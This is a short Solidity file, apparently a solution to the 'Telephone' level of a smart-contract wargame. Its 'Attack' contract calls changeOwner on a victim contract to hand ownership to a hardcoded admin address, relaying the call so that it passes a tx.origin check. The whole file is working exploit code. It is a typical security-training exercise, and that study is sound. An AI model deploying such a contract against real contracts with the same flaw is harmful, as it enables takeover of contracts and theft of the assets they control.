// Instance Address: 0xa22097ea699Ae1ddf4F4ae7DB5149D43b3545beD

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Itelephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    address admin = 0x3765DFeDf234Bf24f9df82715503B864236ddb48;
    function attack (address _victim) public {
        Itelephone(_victim).changeOwner(admin);
    }
}